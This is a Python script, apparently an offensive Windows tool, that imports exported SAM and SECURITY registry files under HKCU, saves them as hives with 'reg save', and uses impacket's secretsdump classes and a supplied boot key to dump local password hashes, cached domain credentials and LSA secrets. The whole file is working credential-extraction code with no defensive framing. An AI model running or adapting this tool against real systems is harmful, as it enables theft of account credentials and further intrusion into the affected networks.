import os
import subprocess
import sys
import argparse
from impacket.examples import secretsdump
from impacket.examples.secretsdump import SAMHashes, LSASecrets

def replace_hklm_with_hkcu(file_path):
    with open(file_path, 'r', encoding='utf-16') as file:
        content = file.read()
    updated_content = content.replace("HKEY_LOCAL_MACHINE", "HKEY_CURRENT_USER\\REGEXPORT")
    with open(file_path, 'w', encoding='utf-16') as file:
        file.write(updated_content)

def import_reg_file(file_path):
    subprocess.run(['reg', 'import', file_path], check=True)

def save_hive(hive_path, save_path):
    subprocess.run(['reg', 'save', hive_path, save_path], check=True)

def dump(bootKey, output_file, sam_file, security_file):
    try:
        print('\n[+] Dumping local SAM hashes')
        bootKey_bytes = bytes.fromhex(bootKey)
        SAMHashesObj = SAMHashes(sam_file, bootKey_bytes, isRemote=False)
        SAMHashesObj.dump()
        if output_file is not None:
            SAMHashesObj.export(output_file)
    except Exception as e:
        print('[-] SAM hashes extraction failed: %s' % str(e))

    try:
        print('[+] Dumping LSA secrets')
        LSASecretsObj = LSASecrets(security_file, bootKey_bytes, isRemote=False, history=False)
        LSASecretsObj.dumpCachedHashes()
        if output_file is not None:
            LSASecretsObj.exportCached(output_file)
        LSASecretsObj.dumpSecrets()
        print()
        if output_file is not None:
            LSASecretsObj.exportSecrets(output_file)
    except Exception as e:
        print('[-] LSA hashes extraction failed: %s' % str(e))

def main(save_directory, bootKey, output_file, sam_file, security_file):
    files = []
    if sam_file:
        files.append(sam_file)
    if security_file:
        files.append(security_file)

    # Replace HKLM with HKCU\REGEXPORT in .reg files
    for file_path in files:
        replace_hklm_with_hkcu(file_path)
        print(f"[*] Updated file: {file_path}")

    # Import modified .reg files into the registry
    for file_path in files:
        import_reg_file(file_path)
        print(f"[*] Imported file: {file_path}")

    # Save the hives in the register
    hive_paths = ["HKCU\\REGEXPORT\\SAM", "HKCU\\REGEXPORT\\SECURITY"]
    for hive_path in hive_paths:
        hive_name = os.path.basename(hive_path)
        save_path = os.path.join(save_directory, f"{hive_name}.hive")
        save_hive(hive_path, save_path)
        print(f"[*] Saved hive: {save_path}")

    #  Path of generated .hive files
    sam_hive_file = os.path.join(save_directory, 'SAM.hive')
    security_hive_file = os.path.join(save_directory, 'SECURITY.hive')

    # Extract SAM and LSA hashes
    dump(bootKey, output_file, sam_hive_file, security_hive_file)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Import results from Reg Export and dump results using Reg Save. Decrypt hives using bootkey to recover Windows secrets.")
    parser.add_argument('--directory', type=str, required=True, help='Directory where the .hive files will be saved')
    parser.add_argument('--bootkey', type=str, required=True, help='Computer Bootkey for SAM and LSA decryption')
    parser.add_argument('--output-file', type=str, help='Output file for SAM and LSA hashes')
    parser.add_argument('--sam', type=str,required=True, help='Path to the SAM file')
    parser.add_argument('--security', type=str,required=True, help='Path to the SECURITY file')
    args = parser.parse_args()

    main(args.directory, args.bootkey, args.output_file, args.sam, args.security)
